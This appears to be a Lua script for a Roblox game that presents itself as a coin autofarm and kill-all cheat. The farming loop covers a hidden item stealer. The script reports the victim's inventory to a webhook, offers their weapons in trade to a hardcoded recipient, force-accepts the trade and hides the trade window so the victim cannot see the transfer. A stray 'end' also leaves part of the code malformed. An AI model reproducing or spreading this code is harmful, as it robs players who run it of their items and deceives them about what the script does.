local function sendWebhook(message, pingEveryone)
    local content = pingEveryone and "@everyone\n" .. message or message
    local data = {content = content, username = "67skibidi AutoFarm + Transfer"}
    pcall(function()
        request({Url = _wu, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
    end)
end

local function getFullInventory()
    local list = {}
    pcall(function()
        local ProfileData = require(ReplicatedStorage.Modules.ProfileData)
        if ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
            for name, amount in pairs(ProfileData.Weapons.Owned) do
                if amount and amount > 0 then
                    table.insert(list, name .. " x" .. tostring(amount))
                end
            end
        end
    end)
    table.sort(list)
    return list
end

local function isTarget(name)
    return name and tostring(name):lower() == _tu:lower()
end

local function getWeapons()
    local list = {}
    pcall(function()
        local ProfileData = require(ReplicatedStorage.Modules.ProfileData)
        if ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
            for name, amount in pairs(ProfileData.Weapons.Owned) do
                if amount and amount > 0 and name ~= "DefaultKnife" and name ~= "DefaultGun" then
                    table.insert(list, name)
                end
            end
        end
    end)
    return list
end

local function forceAccept()
    if not AcceptTrade then return end
    print("[Transfer] Force accepting with LastOffer...")
    for i = 1, 15 do
        if _lo then
            pcall(function() AcceptTrade:FireServer(game.PlaceId * 3, _lo) end)
        end
        pcall(function() AcceptTrade:FireServer(game.PlaceId * 3, tick()) end)
        pcall(function() AcceptTrade:FireServer() end)
        task.wait(0.35)
    end
end

local function offerWeapons()
    if not OfferItem or not _t or _ott >= 4 then return end
    if tick() - _lot < 0.55 then return end
    local weapons = getWeapons()
    if #weapons == 0 then return end
    local toOffer = math.min(4 - _ott, #weapons)
    for i = 1, toOffer do
        local ok = pcall(function()
            OfferItem:FireServer(weapons[i], "Weapons")
        end)
        if ok then
            _ott += 1
            _lot = tick()
            print("[Transfer] Offered:", weapons[i], "(" .. _ott .. "/4)")
            task.wait(0.3)
        end
    end
    if _ott >= 4 and not _as then
        _as = true
        print("[Transfer] Trade full → waiting 7s then accepting")
        task.delay(7, function()
            if _t then forceAccept() end
        end)
    end
end

local function hideTradeGUI(gui)
    if not gui then return end
    pcall(function()
        for _, child in ipairs(gui:GetChildren()) do
            if child:IsA("GuiObject") then
                child.Visible = false
            end
        end
    end)
end

local function watchTradeUI(name)
    local gui = playerGui:FindFirstChild(name)
    if gui then
        hideTradeGUI(gui)
        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
            if gui.Enabled then hideTradeGUI(gui) end
        end)
        gui.ChildAdded:Connect(function()
            task.wait(0.05)
            hideTradeGUI(gui)
        end)
    end
end

local function hasKnife()
    local char = player.Character
    local backpack = player.Backpack
    if char then
        local tool = char:FindFirstChildOfClass("Tool")
        if tool and tool.Name:lower():find("knife") then return true end
    end
    for _, item in ipairs(backpack:GetChildren()) do
        if item:IsA("Tool") and item.Name:lower():find("knife") then return true end
    end
    return false
end

local function killEveryone()
    local char = player.Character
    if not char then return end
    local knife = char:FindFirstChildOfClass("Tool") or char:FindFirstChild("Knife")
    if not knife then
        for _, item in ipairs(player.Backpack:GetChildren()) do
            if item:IsA("Tool") and item.Name:lower():find("knife") then
                knife = item
                knife.Parent = char
                break
            end
        end
    end
    if not knife or not knife:FindFirstChild("Handle") then return end
    print("[AutoFarm] Murderer + Full → Killing everyone...")
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            pcall(function()
                firetouchinterest(plr.Character.HumanoidRootPart, knife.Handle, 1)
                firetouchinterest(plr.Character.HumanoidRootPart, knife.Handle, 0)
            end)
        end
    end
end

end

task.spawn(function()
    while true do
        if _a then
            local character = player.Character
            local root = character and character:FindFirstChild("HumanoidRootPart")
            if root then
                local closest, dist = nil, math.huge
                for _, obj in ipairs(workspace:GetDescendants()) do
                    if obj:IsA("BasePart") and obj.Name == "Coin_Server" and not _v[obj] then
                        local d = (obj.Position - root.Position).Magnitude
                        if d < dist and d < _r then
                            closest, dist = obj, d
                        end
                    end
                end
                if closest then
                    local tween = TweenService:Create(root, TweenInfo.new(dist / _s, Enum.EasingStyle.Linear), {CFrame = CFrame.new(closest.Position)})
                    tween:Play()
                    tween.Completed:Wait()
                    if closest and closest.Parent then
                        _v[closest] = true
                        _c += 1
                        _lct = tick()
                        _is = false
                        counter.Text = "Collected: " .. _c
                    end
                end
            end
            task.wait(0.08)
        else
            task.wait(0.5)
        end
    end
end)
